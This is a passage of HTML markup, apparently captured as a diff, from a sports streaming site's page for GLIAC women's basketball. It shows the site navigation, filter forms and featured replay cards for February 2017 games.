+      <rect width="11" height="9"/><rect x="13" width="6" height="4"/><rect x="13" y="6" width="6" height="3"/><rect x="13" y="11" width="6" height="3"/><rect x="7" y="11" width="4" height="3"/><rect y="11" width="5" height="3"/>
+    </g>
+    <g id="social-icons--list" viewBox="0 0 19 14">
+      <rect width="5" height="3"/><rect x="7" width="12" height="3"/><rect x="7" y="5" width="12" height="3"/><rect x="7" y="10" width="12" height="3"/><rect y="10" width="5" height="3"/><rect y="5" width="5" height="3"/>
+    </g>
+  </defs>
+</svg>
+    <header id="site-header" role="banner" class="site-header header-top is-top">
+  <div class="site-container site-header__inner">
+
+    <a id="site-mobile-nav__toggle" class="site-mobile-nav__toggle">
+      <span class="site-mobile-nav__toggle__stripe"></span>
+      <span class="site-mobile-nav__toggle__stripe"></span>
+      <span class="site-mobile-nav__toggle__stripe"></span>
+    </a>
+
+    <a class="site-logo__container" href="/">
+      <img class="site-logo" src="/sites/all/themes/eversport_theme/images/logo--eversport--white.png" alt="EverSport Logo">
+      <span class="site-logo__tagline">
+        The home for live sports broadcasts      </span>
+    </a>
+
+          <nav class="desktop-nav" role="navigation">
+                  <div class="menu-links__container menu-links__container--main-nav js-responsive-move" data-js-responsive-move="main-nav" data-js-responsive-move-breakpoint="768">
+            <ul class="menu nav navbar-nav"><li class="first leaf"><a href="/" title="">Home</a></li>
+<li class="expanded"><span title="" class="nolink">Pro</span><ul class="menu nav"><li class="first expanded"><a href="/action-sports" title="">Action Sports</a><ul class="menu nav"><li class="first leaf"><a href="/action-sports/kayaking" title="">Kayaking</a></li>
+<li class="expanded"><a href="/action-sports/mountain-biking" title="">Mountain Biking</a><ul class="menu nav"><li class="first leaf"><a href="/action-sports/mountain-biking/cape-epic" title="">Cape Epic</a></li>
+<li class="last leaf"><a href="/action-sports/mountain-biking/crankworx" title="">Crankworx</a></li>
+</ul></li>
+<li class="leaf"><a href="/action-sports/climbing" title="">Rock Climbing</a></li>
+<li class="leaf"><a href="/action-sports/skate" title="">Skate</a></li>
+<li class="leaf"><a href="/action-sports/snow" title="">Snow</a></li>
+<li class="leaf"><a href="/action-sports/surf" title="">Surf</a></li>
+<li class="last leaf"><a href="/action-sports/wake" title="">Wake</a></li>
+</ul></li>
+<li class="expanded"><a href="/indoor-football" title="">Indoor Football</a><ul class="menu nav"><li class="first leaf"><a href="/indoor-football/cif" title="">CIF</a></li>
+<li class="last leaf"><a href="/indoor-football/ifl" title="">IFL</a></li>
+</ul></li>
+<li class="expanded"><a href="/alpine" title="">Alpine</a><ul class="menu nav"><li class="first last leaf"><a href="/alpine/luge" title="">Luge</a></li>
+</ul></li>
+<li class="expanded"><a href="/athletics" title="">Athletics</a><ul class="menu nav"><li class="first leaf"><a href="/athletics/eaa-meetings" title="">EAA Meetings</a></li>
+<li class="leaf"><a href="/athletics/golden-fly-series" title="">Golden Fly Series</a></li>
+<li class="leaf"><a href="/athletics/iaaf-world-challenge" title="">IAAF World Challenge</a></li>
+<li class="last leaf"><a href="/athletics/marathon" title="">Marathon</a></li>
+</ul></li>
+<li class="leaf"><a href="/badminton" title="">Badminton</a></li>
+<li class="expanded"><a href="/basketball" title="">Basketball</a><ul class="menu nav"><li class="first last leaf"><a href="/basketball/aba-liga" title="">ABA Liga</a></li>
+</ul></li>
+<li class="leaf"><a href="/boxing" title="">Boxing</a></li>
+<li class="collapsed"><a href="/cricket" title="">Cricket</a></li>
+<li class="leaf"><a href="/cycling" title="">Cycling</a></li>
+<li class="expanded"><a href="/fight-sports" title="">Fight Sports</a><ul class="menu nav"><li class="first leaf"><a href="/fight-sports/glory-kickboxing" title="">Glory Kickboxing</a></li>
+<li class="last leaf"><a href="/fight-sports/rizin" title="">Rizin Federation</a></li>
+</ul></li>
+<li class="expanded"><a href="/football" title="">Football (Soccer)</a><ul class="menu nav"><li class="first leaf"><a href="/football/a-league" title="">Australian A-League</a></li>
+<li class="leaf"><a href="/football/swiss-super-league" title="">Swiss Super League</a></li>
+<li class="leaf"><a href="/football/swiss-cup" title="">Swiss Cup</a></li>
+<li class="last leaf"><a href="/football/fifa" title="">FIFA</a></li>
+</ul></li>
+<li class="leaf"><a href="/gymnastics" title="">Gymnastics</a></li>
+<li class="expanded"><a href="/ice-hockey" title="">Ice Hockey</a><ul class="menu nav"><li class="first leaf"><a href="/ice-hockey/del" title="">DEL</a></li>
+<li class="leaf"><a href="/ice-hockey/ebel" title="">EBEL</a></li>
+<li class="last leaf"><a href="/ice-hockey/swedish-hockey-league" title="">SHL</a></li>
+</ul></li>
+<li class="expanded"><a href="/motorsport" title="">Motorsport</a><ul class="menu nav"><li class="first leaf"><a href="/motorsport/arrc" title="">Asia Road Racing Championship</a></li>
+<li class="leaf"><a href="/motorsport/drift-allstars" title="">Drift All-Stars</a></li>
+<li class="leaf"><a href="/motorsport/drift-masters" title="">Drift Masters</a></li>
+<li class="leaf"><a href="/motorsport/ferrari-challenge" title="">Ferrari Challenge</a></li>
+<li class="leaf"><a href="/motorsport/formula-1" title="">Formula 1</a></li>
+<li class="leaf"><a href="/motorsport/formula-drift" title="">Formula Drift</a></li>
+<li class="leaf"><a href="/motorsport/monza-rally-show" title="">Monza Rally Show</a></li>
+<li class="leaf"><a href="/motorsport/motocross" title="">Motocross</a></li>
+<li class="leaf"><a href="/motorsport/porsche-carrera-cup" title="">Porsche Carrera Cup</a></li>
+<li class="leaf"><a href="/motorsport/race-champions" title="">Race of Champions</a></li>
+<li class="last leaf"><a href="/motorsport/vw-scirocco-r-cup" title="">VW Scirocco Cup</a></li>
+</ul></li>
+<li class="expanded"><a href="/rugby" title="">Rugby</a><ul class="menu nav"><li class="first leaf"><a href="/rugby/serevi-rugbytown-7s" title="">Serevi RugbyTown 7&#039;s</a></li>
+<li class="leaf"><a href="/rugby/rbs-6-nations" title="">RBS 6 Nations</a></li>
+<li class="leaf"><a href="/rugby/pacific-rugby-premiership" title="">Pacific Rugby Premiership</a></li>
+<li class="leaf"><a href="/rugby/usa-rugby" title="">USA Rugby</a></li>
+<li class="leaf"><a href="/rugby/american-rugby-7s" title="">American Rugby 7&#039;s</a></li>
+<li class="leaf"><a href="/rugby/asian-rugby-championship" title="">Asian Rugby Championships</a></li>
+<li class="last leaf"><a href="/rugby/major-rugby-championship" title="">Major Rugby Championship</a></li>
+</ul></li>
+<li class="expanded"><a href="/swimming" title="">Swimming</a><ul class="menu nav"><li class="first leaf"><a href="/diving/fina-diving-world-series" title="FINA Diving World Series">FINA Diving World Series</a></li>
+<li class="last leaf"><a href="/swimming/mare-nostrum" title="Mare Nostrum">Mare Nostrum</a></li>
+</ul></li>
+<li class="leaf"><a href="/tennis" title="">Tennis</a></li>
+<li class="last leaf"><a href="/table-tennis" title="">Table Tennis</a></li>
+</ul></li>
+<li class="expanded active-trail"><span title="" class="active-trail nolink">College</span><ul class="menu nav"><li class="first collapsed"><a href="/acha" title="">ACHA</a></li>
+<li class="expanded"><a href="/asun" title="">ASUN</a><ul class="menu nav"><li class="first leaf"><a href="/atlantic-sun/baseball" title="">Baseball</a></li>
+<li class="leaf"><a href="/atlantic-sun/lacrosse-womens" title="">Lacrosse - Women&#039;s</a></li>
+<li class="leaf"><a href="/atlantic-sun/soccer-mens" title="">Soccer - Men&#039;s</a></li>
+<li class="leaf"><a href="/atlantic-sun/soccer-womens" title="">Soccer - Women&#039;s</a></li>
+<li class="leaf"><a href="/atlantic-sun/softball" title="">Softball</a></li>
+<li class="last leaf"><a href="/atlantic-sun/volleyball-womens" title="">Volleyball - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><a href="/big-east" title="">Big East</a><ul class="menu nav"><li class="first leaf"><a href="/big-east/basketball-mens" title="">Basketball - Men&#039;s</a></li>
+<li class="last leaf"><a href="/big-east/basketball-womens" title="">Basketball - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><a href="/big-sky" title="">Big Sky</a><ul class="menu nav"><li class="first leaf"><a href="/big-sky/basketball-mens" title="">Basketball - Men&#039;s</a></li>
+<li class="leaf"><a href="/big-sky/basketball-womens" title="">Basketball - Women&#039;s</a></li>
+<li class="leaf"><a href="/big-sky/football" title="">Football</a></li>
+<li class="leaf"><a href="/big-sky/soccer-womens" title="">Soccer - Women&#039;s</a></li>
+<li class="leaf"><a href="/big-sky/softball" title="">Softball</a></li>
+<li class="leaf"><a href="/big-sky/track-field" title="">Track &amp; Field</a></li>
+<li class="last leaf"><a href="/big-sky/volleyball-womens" title="">Volleyball - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><a href="/big-ten" title="">Big Ten</a><ul class="menu nav"><li class="first leaf"><a href="/big-ten/basketball-mens" title="">Basketball - Men&#039;s</a></li>
+<li class="leaf"><a href="/big-ten/basketball-womens" title="">Basketball - Women&#039;s</a></li>
+<li class="leaf"><a href="/big-ten/field-hockey" title="">Field Hockey</a></li>
+<li class="leaf"><a href="http://eversport.tv/big-ten/football" title="">Football</a></li>
+<li class="leaf"><a href="/big-ten/gymnastics" title="">Gymnastics</a></li>
+<li class="leaf"><a href="http://eversport.tv/big-ten/ice-hockey-mens" title="">Ice Hockey - Men&#039;s</a></li>
+<li class="leaf"><a href="http://eversport.tv/big-ten/soccer-mens" title="">Soccer - Men&#039;s</a></li>
+<li class="leaf"><a href="http://eversport.tv/big-ten/soccer-womens" title="">Soccer - Women&#039;s</a></li>
+<li class="leaf"><a href="/big-ten/volleyball-mens" title="">Volleyball - Men&#039;s</a></li>
+<li class="leaf"><a href="http://eversport.tv/big-ten/volleyball-womens" title="">Volleyball - Women&#039;s</a></li>
+<li class="last leaf"><a href="http://eversport.tv/big-ten/wrestling" title="">Wrestling</a></li>
+</ul></li>
+<li class="expanded active-trail"><a href="/gliac" title="" class="active-trail">Great Lakes</a><ul class="menu nav"><li class="first leaf"><a href="/great-lakes/basketball-mens" title="">Basketball - Men&#039;s</a></li>
+<li class="leaf active-trail"><a href="/great-lakes/basketball-womens" title="" class="active-trail active">Basketball - Women&#039;s</a></li>
+<li class="leaf"><a href="/gliac/football" title="">Football</a></li>
+<li class="leaf"><a href="/gliac/lacrosse" title="">Lacrosse</a></li>
+<li class="leaf"><a href="/great-lakes/soccer-womens" title="">Soccer - Women&#039;s</a></li>
+<li class="last leaf"><a href="/great-lakes/volleyball-womens" title="">Volleyball - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><a href="/gulf-south" title="">Gulf South</a><ul class="menu nav"><li class="first leaf"><a href="/gulf-south/basketball-mens" title="">Basketball - Men&#039;s</a></li>
+<li class="leaf"><a href="/gulf-south/basketball-womens" title="">Basketball - Women&#039;s</a></li>
+<li class="last leaf"><a href="/gulf-south/volleyball-womens" title="">Volleyball - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><span title="" class="nolink">Ice Hockey</span><ul class="menu nav"><li class="first leaf"><a href="/acha/hockey-mens" title="">AHCA Men&#039;s Hockey</a></li>
+<li class="last leaf"><a href="/wshl/hockey-mens" title="">WSHL</a></li>
+</ul></li>
+<li class="expanded"><a href="/mpsf" title="">MPSF</a><ul class="menu nav"><li class="first last leaf"><a href="/mpsf/gymnastics" title="">Gymnastics</a></li>
+</ul></li>
+<li class="expanded"><a href="/mrgc" title="">MRGC</a><ul class="menu nav"><li class="first last leaf"><a href="/mrgc/gymnastics-womens" title="">Gymnastics - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><a href="/pac-12" title="">Pac-12</a><ul class="menu nav"><li class="first leaf"><a href="http://eversport.tv/content/pac-12-networks-live" title="">Pac-12 Networks Live</a></li>
+<li class="leaf"><a href="http://eversport.tv/pac-12/basketball-mens" title="">Basketball - Men&#039;s</a></li>
+<li class="leaf"><a href="/pac-12/basketball-womens" title="">Basketball - Women&#039;s</a></li>
+<li class="leaf"><a href="/pac-12/soccer-mens" title="">Soccer-Men&#039;s</a></li>
+<li class="leaf"><a href="http://eversport.tv/pac-12/football" title="">Football</a></li>
+<li class="leaf"><a href="http://eversport.tv/pac-12/soccer-womens" title="">Soccer - Women&#039;s</a></li>
+<li class="last leaf"><a href="http://eversport.tv/pac-12/volleyball-womens" title="">Volleyball - Women&#039;s</a></li>
+</ul></li>
+<li class="expanded"><a href="/rugby/nscro" title="">Rugby</a><ul class="menu nav"><li class="first last leaf"><a href="/rugby/nscro" title="">NSCRO</a></li>
+</ul></li>
+<li class="last expanded"><a href="/wac" title="">WAC</a><ul class="menu nav"><li class="first last leaf"><a href="/wac/baseball" title="">Baseball</a></li>
+</ul></li>
+</ul></li>
+<li class="last expanded"><span title="" class="nolink">National</span><ul class="menu nav"><li class="first leaf"><a href="/football/u12-jr-soccer-world-challenge" title="">U12 Jr Soccer World Challenge</a></li>
+<li class="leaf"><a href="/football/eaff-east-asian-cup-men" title="">EAFF East Asian Cup 2015 - Men&#039;s</a></li>
+<li class="leaf"><a href="/football/eaff-east-asian-cup-women" title="">EAFF East Asian Cup 2015 - Women&#039;s</a></li>
+<li class="leaf"><a href="/football/aff-suzuki-cup-2014" title="">AFF Suzuki Cup</a></li>
+<li class="leaf"><a href="/football/durban-u19" title="">Durban U19</a></li>
+<li class="leaf"><a href="/football/homeless-world-cup" title="">Homeless World Cup</a></li>
+<li class="leaf"><a href="/football/2015-j-youth-cup" title="">2015 J Youth Cup</a></li>
+<li class="expanded"><span title="" class="nolink">AFC</span><ul class="menu nav"><li class="first leaf"><a href="/football/afc-u-16-womens-championship" title="">AFC U-16 Women&#039;s Championship</a></li>
+<li class="leaf"><a href="/football/afc-u-19-womens-champ" title="">AFC Women&#039;s U-19 Champ.</a></li>
+<li class="leaf"><a href="/football/afc-asian-cup-2015" title="">AFC Asian Cup 2015</a></li>
+<li class="last leaf"><a href="/football/afc-cup" title="">AFC Cup</a></li>
+</ul></li>
+<li class="leaf"><a href="/cricket" title="">Cricket</a></li>
+<li class="last leaf"><a href="/rugby/usa-rugby" title="">USA Rugby</a></li>
+</ul></li>
+</ul>          </div>
+                          <div class="menu-links__container menu-links__container--adjacent-nav js-responsive-move" data-js-responsive-move="adjacent-nav" data-js-responsive-move-breakpoint="480">
+            <div id="eversport-upcoming-archive-links" class="menu-links"><a href="/#list" class="menu-links__link">Archive</a></div>          </div>
+                          <div id="site-search" style="display: none;">
+            <form action="/great-lakes/basketball-womens" method="post" id="eversport-consumer-search-search-box-form" accept-charset="UTF-8"><div><input placeholder="Search" autocapitalize="off" autocorrect="off" type="text" id="edit-search-box" name="search_box" value="" size="60" maxlength="128" class="form-text required form-autocomplete live-results-search-textfield" /><input type="hidden" id="edit-search-box-autocomplete" value="http://eversport.tv/search_api_live_results/search_api_views_consumer_search_autocomplete" disabled="disabled" class="live-result-autocomplete" /><input type="submit" id="edit-submit" name="op" value="" class="form-submit" /><input type="hidden" name="form_build_id" value="form-sbn1JO51bWlIWDUwYIaVTF9qgYY6YtbMil8V3bo_O9o" />
+<input type="hidden" name="form_id" value="eversport_consumer_search_search_box_form" />
+</div></form>          </div>
+              </nav>
+      </div>
+      <div id="secondary-menu" class="secondary-menu">
+      <form action="/great-lakes/basketball-womens" method="post" id="eversport-menu-secondary-menu-form" accept-charset="UTF-8"><div><div class="secondary-menu__inner form-wrapper" id="edit-secondary-menu"><div class="eversport-thumbnail-view secondary-menu__item secondary-menu__item--grid"><a id="grid-link" class="secondary-menu__link secondary-menu__link--grid" href="#grid"><svg viewBox="0 0 19 14" class="secondary-menu__icon secondary-menu__icon--grid"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#social-icons--grid"></use></svg>Grid</a></div><div class="eversport-schedule-view secondary-menu__item secondary-menu__item--list"><a id="list-link" class="secondary-menu__link secondary-menu__link--list" href="#list"><svg viewBox="0 0 19 14" class="secondary-menu__icon secondary-menu__icon--list"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#social-icons--list"></use></svg>List</a></div><div id="menu-date-select" class="menu-date-select secondary-menu__item secondary-menu__item--calendar"><a id="menu-date-select__button" class="menu-date-select__button secondary-menu__link secondary-menu__link--calendar"><svg viewBox="0 0 17 17" class="secondary-menu__icon secondary-menu__icon--calendar"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#social-icons--calendar--large"></use></svg><span class="bp-s--hide--inline">Calendar</span><span class="secondary-menu__small-icon-text">Cal</span></a><div id="menu-calendar__container" class="menu-calendar__container calendar"  data-schedule="week" ><div id="menu-calendar--year" class="menu-calendar--year"><ul class="menu-calendar--year__month-list"><li class="menu-calendar--year__month-item" data-month="0">Jan</li><li class="menu-calendar--year__month-item" data-month="1">Feb</li><li class="menu-calendar--year__month-item" data-month="2">Mar</li><li class="menu-calendar--year__month-item" data-month="3">Apr</li><li class="menu-calendar--year__month-item" data-month="4">May</li><li class="menu-calendar--year__month-item" data-month="5">Jun</li><li class="menu-calendar--year__month-item" data-month="6">Jul</li><li class="menu-calendar--year__month-item" data-month="7">Aug</li><li class="menu-calendar--year__month-item" data-month="8">Sep</li><li class="menu-calendar--year__month-item" data-month="9">Oct</li><li class="menu-calendar--year__month-item" data-month="10">Nov</li><li class="menu-calendar--year__month-item" data-month="11">Dec</li></ul></div></div></div><div class="form-item form-type-select form-item-sports">
+  <label class="element-invisible" for="edit-sports">sports </label>
+ <select data-placeholder="All Sports &amp; This" id="edit-sports" name="sports" class="form-select"><option value="/#schedule">All Sports</option><option value="/acha">ACHA</option><option value="/action-sports">Action Sports</option><option value="/alpine">Alpine</option><option value="/asun">ASUN</option><option value="/athletics">Athletics</option><option value="/atlantic-hockey">Atlantic Hockey</option><option value="/badminton">Badminton</option><option value="/basketball">Basketball</option><option value="/big-12">Big 12</option><option value="/big-east">Big East</option><option value="/big-sky">Big Sky</option><option value="/big-ten">Big Ten</option><option value="/boxing">Boxing</option><option value="/c-usa">C-USA</option><option value="/cha-womens">CHA - Women&#039;s</option><option value="/cricket">Cricket</option><option value="/cycling">Cycling</option><option value="/diving">Diving</option><option value="/fight-sports">Fight Sports</option><option value="/football">Football</option><option value="/great-lakes/basketball-womens?term=22311" selected="selected">GLIAC</option><option value="/gulf-south">Gulf South</option><option value="/gymnastics">Gymnastics</option><option value="/gymnastics-0">Gymnastics</option><option value="/handball">Handball</option><option value="/hockey">Hockey</option><option value="/ice-hockey">Ice Hockey</option><option value="/indoor-football">Indoor Football</option><option value="/ivy-league">Ivy League</option><option value="/motorsport">Motorsport</option><option value="/mpsf">MPSF</option><option value="/mrgc">MRGC</option><option value="/netball">Netball</option><option value="/pac-12">Pac-12</option><option value="/rugby">Rugby</option><option value="/sec">SEC</option><option value="/sepak-takraw">Sepak Takraw</option><option value="/squash">Squash</option><option value="/swimming">Swimming</option><option value="/table-tennis">Table Tennis</option><option value="/tennis">Tennis</option><option value="/veracruz-2014">Veracruz 2014</option><option value="/volleyball">Volleyball</option><option value="/water-polo">Water Polo</option><option value="/wshl">WSHL</option></select>
+</div>
+<div class="form-item form-type-select form-item-leagues">
+  <label class="element-invisible" for="edit-leagues">leagues </label>
+ <select data-placeholder="All Leagues" id="edit-leagues" name="leagues" class="form-select"><option value="/gliac">All Leagues</option><option value="/great-lakes/basketball-mens">Basketball - Men&#039;s</option><option value="/great-lakes/basketball-womens" selected="selected">Basketball - Women&#039;s</option><option value="/gliac/football">Football</option><option value="/gliac/lacrosse">Lacrosse</option><option value="/gliac/soccer-mens">Soccer - Men&#039;s</option><option value="/great-lakes/soccer-womens">Soccer - Women&#039;s</option><option value="/gliac/special-event">Special Event</option><option value="/great-lakes/volleyball-womens">Volleyball - Women&#039;s</option></select>
+</div>
+<div class="form-item form-type-select form-item-teams">
+  <label class="element-invisible" for="edit-teams">teams </label>
+ <select data-placeholder="All Teams" id="edit-teams" name="teams" class="form-select"><option value="">All Teams</option><option value="/gliac/basketball-womens/lake-superior-state">Lake Superior State</option><option value="/great-lakes/basketball-womens/northern-michigan">Northern Michigan</option></select>
+</div>
+</div><input type="hidden" name="form_build_id" value="form-SPr9TbYwfW9wO3i0ZzuL8pplIxS5BgieaR6LS8Mi9XA" />
+<input type="hidden" name="form_id" value="eversport_menu_secondary_menu_form" />
+</div></form>    </div>
+  </header>
+
+
+<div id="site-header__spacer" class="site-header__spacer"></div>
+<div id="site-main-canvas" class="site-main-canvas">
+      <main id="top" class="site-main">
+
+    
+    
+      <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div class="term-listing-heading"><section id="taxonomy-term-22331" class="taxonomy-term vocabulary-leagues">
+  <div class="site-container">
+    <header class="eversport-header">
+            <div class="eversport-header__content event-info-phase-lines">
+                  <div class="eversport-header__kicker">
+            <h3 class="eversport-header__kicker-item eversport-header__kicker-item--sport">
+  <a href="/gliac" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="">GLIAC</a></h3>          </div>
+                <h1 class="eversport-header__title">Basketball - Women&#039;s</h1>
+      </div>
+          </header>
+  </div>
+
+  <div class="taxonomy-tab__container">
+    <div id="taxonomy-tab--grid" class="taxonomy-tab primary-grid__container">
+      <div class="site-container">
+        <h2 class="h2--alt">Featured Events</h2>
+      </div>
+      <div class="site-container--to-md">
+        <div class="primary-grid">
+          <div class="primary-grid__col-1">
+            <div class="views--main-featured-videos">
+              <div class="view view-main-featured-video view-id-main_featured_video view-display-id-homepage_featured_events single-feature view-dom-id-8b1204a0f498b789fdc46b7c827b7f85 view-total-rows-8">
+  
+  
+  
+      <div class="view-main-featured-video__content">
+        <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-1 views-row-odd views-row-first" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/18/wayne-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" alt="Wayne State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Wayne State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-18T18:00:00+00:00" data-format="d M H:i T">18 Feb 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Wayne State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-2 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/16/saginaw-valley-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" alt="Saginaw Valley State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Saginaw Valley State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-16T22:30:00+00:00" data-format="d M H:i T">16 Feb 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Saginaw Valley State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-3 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/11/wayne-state-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_56.jpg?itok=dhaavWnA" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_56.jpg?itok=AQ-3IZSw" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_56.jpg?itok=nnE9tm72" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_56.jpg?itok=GyE0cFKk" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_56.jpg?itok=dhaavWnA" alt="Wayne State at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Wayne State<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-11T16:00:00+00:00" data-format="d M H:i T">11 Feb 16:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Wayne State at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-4 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/9/saginaw-valley-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_55.jpg?itok=yvOpNAHX" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_55.jpg?itok=9zxhuY1w" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_55.jpg?itok=AbQn9Owd" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_55.jpg?itok=A1ce5cSL" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_55.jpg?itok=yvOpNAHX" alt="Saginaw Valley at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Saginaw Valley<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-09T23:00:00+00:00" data-format="d M H:i T">09 Feb 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Saginaw Valley at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-5 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/30/michigan-tech-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
